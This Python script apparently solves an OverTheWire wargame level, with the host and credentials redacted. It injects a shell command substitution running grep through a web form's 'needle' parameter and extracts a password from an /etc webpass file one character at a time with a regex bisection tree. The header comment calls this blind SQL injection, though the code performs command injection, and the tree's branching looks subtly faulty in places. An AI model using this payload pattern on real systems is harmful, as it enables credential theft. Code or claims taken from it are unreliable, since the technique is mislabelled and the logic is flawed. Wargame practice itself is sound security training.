#!/bin/python3
import urllib.request
from html.parser import HTMLParser

# Performs a blind SQL injection to recover a password from a remote server.
# A regex search tree is used to speed up the blind sql recovery
# The server is owned by overthewire.org and was used to solve one of their challenges
# portions have been removed so this script can't been used to cheat the challenge.

# authentication setup
passwordMgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
topLeveURL = "[REDACTED]"
passwordMgr.add_password(None, topLeveURL, '[REDACTED]', '[REDACTED]')

handler = urllib.request.HTTPBasicAuthHandler(passwordMgr)

opener = urllib.request.build_opener(handler)
urllib.request.install_opener(opener)

stem = '[REDACTED]/?needle=hello$(grep%20-n%20-e%20'
tail = '%20/etc/[REDACTED]_webpass/[REDACTED]'
password = ''

class MyHTMLParser(HTMLParser):

	def __init__(self):
		HTMLParser.__init__(self)
		self.flag = False
		self.lasttag = None
		self.inLink = False

	def handle_starttag(self, tag, attrs):
		self.inLink = False
		if tag == 'pre':
			self.inLink = True
			self.lasttag = tag

	def handle_endtag(self, tag):
		if tag == 'pre':
			self.inLink = False

	def handle_data(self, data):
		if self.inLink and self.lasttag == 'pre' and data.strip() == '':
			self.flag = True


#ab cd ef gh ij kl m|n op qr st uv wx yz
#01 23 45 67 89

def checkRegex(regex):
	parser = MyHTMLParser()
	print(stem+regex+tail)
	response = urllib.request.urlopen(stem+regex+tail)
	parser.feed(response.read().decode(encoding='UTF-8',errors='strict'))
	return parser.flag

# whoa check out this if tree
# there are more branches than a chrismas tree
# what a scrub

for i in range (1,32):
	if checkRegex('^' + password +'[a-z]'):
		if checkRegex('^' + password +'[a-m]'):
			if checkRegex('^' + password +'[a-g]'):
				if checkRegex('^' + password +'[a-c]'):
					if checkRegex('^' + password +'[a-b]'):
						if checkRegex('^' + password +'[a]'): password += 'a'
						else: password += 'b'
					else: password += 'c'
				elif checkRegex('^' + password +'[d-g]'):
					if checkRegex('^' + password +'[d-e]'):
						if checkRegex('^' + password +'[d]'): password += 'd'
						else: password += 'e'
					elif checkRegex('^' + password +'[f-g]'):
						if checkRegex('^' + password +'[f]'): password += 'f'
						else: password += 'g'
			if checkRegex('^' + password +'[h-j]'):
				if checkRegex('^' + password +'[h-i]'):
					if checkRegex('^' + password +'[h]'): password += 'h'
					else: password += 'i'
				else: password += 'j'
			elif checkRegex('^' + password +'[k-m]'):
				if checkRegex('^' + password +'[k-l]'):
					if checkRegex('^' + password +'[k]'): password += 'k'
					else: password += 'l'
				else: password += 'm'
		elif checkRegex('^' + password +'[n-s]'):
			if checkRegex('^' + password +'[n-p]'):
				if checkRegex('^' + password +'[n-o]'):
					if checkRegex('^' + password +'[n]'): password += 'n'
					else: password += 'o'
				else: password += 'p'
			elif checkRegex('^' + password +'[q-s]'):
				if checkRegex('^' + password +'[q-r]'):
					if checkRegex('^' + password +'[q]'): password += 'q'
					else: password += 'r'
				else: password += 's'
		elif checkRegex('^' + password +'[t-v]'):
			if checkRegex('^' + password +'[t-u]'):
				if checkRegex('^' + password +'[t]'): password += 't'
				else: password += 'u'
			else: password += 'v'
		elif checkRegex('^' + password +'[w-x]'):
			if checkRegex('^' + password +'[w]'): password += 'w'
			else: password += 'x'
		elif checkRegex('^' + password +'[y]'): password += 'y'
		else: password += 'z'
	elif checkRegex('^' + password +'[A-Z]'):
		if checkRegex('^' + password +'[A-M]'):
			if checkRegex('^' + password +'[A-G]'):
				if checkRegex('^' + password +'[A-C]'):
					if checkRegex('^' + password +'[A-B]'):
						if checkRegex('^' + password +'[A]'): password += 'A'
						else: password += 'B'
					else: password += 'C'
				elif checkRegex('^' + password +'[D-G]'):
					if checkRegex('^' + password +'[D-E]'):
						if checkRegex('^' + password +'[D]'): password += 'D'
						else: password += 'E'
					elif checkRegex('^' + password +'[F-G]'):
						if checkRegex('^' + password +'[F]'): password += 'F'
						else: password += 'G'
			elif checkRegex('^' + password +'[H-J]'):
				if checkRegex('^' + password +'[H-I]'):
					if checkRegex('^' + password +'[H]'): password += 'H'
					else: password += 'I'
				else: password += 'J'
			elif checkRegex('^' + password +'[K-M]'):
				if checkRegex('^' + password +'[K-L]'):
					if checkRegex('^' + password +'[K]'): password += 'K'
					else: password += 'L'
				else: password += 'M'
		elif checkRegex('^' + password +'[N-S]'):
			if checkRegex('^' + password +'[N-P]'):
				if checkRegex('^' + password +'[N-O]'):
					if checkRegex('^' + password +'[N]'): password += 'N'
					else: password += 'O'
				else: password += 'P'
			elif checkRegex('^' + password +'[Q-S]'):
				if checkRegex('^' + password +'[Q-R]'):
					if checkRegex('^' + password +'[Q]'): password += 'Q'
					else: password += 'R'
				else: password += 'S'
		elif checkRegex('^' + password +'[T-V]'):
			if checkRegex('^' + password +'[T-U]'):
				if checkRegex('^' + password +'[T]'): password += 'T'
				else: password += 'U'
			else: password += 'V'
		elif checkRegex('^' + password +'[W-X]'):
			if checkRegex('^' + password +'[W]'): password += 'W'
			else: password += 'X'
		elif checkRegex('^' + password +'[Y]'): password += 'Y'
		else: password += 'Z'
	elif checkRegex('^' + password +'[0-9]'):
		if checkRegex('^' + password +'[0-4]'):
			if checkRegex('^' + password +'[0-2]'):
				if checkRegex('^' + password +'[0-1]'):
					if checkRegex('^' + password +'[0]'): password += '0'
					else: password += '1'
				else: password += '2'
			elif checkRegex('^' + password +'[3]'): password += '3'
			else: password += '4'
		elif checkRegex('^' + password +'[5-7]'):
			if checkRegex('^' + password +'[5-6]'):
				if checkRegex('^' + password +'[5]'): password += '5'
				else: password += '6'
			else: password += '7'
		elif checkRegex('^' + password +'[8]'): password += '8'
		else: password += '9'
	else: print("something is weird about char " + str(i));

print(password)
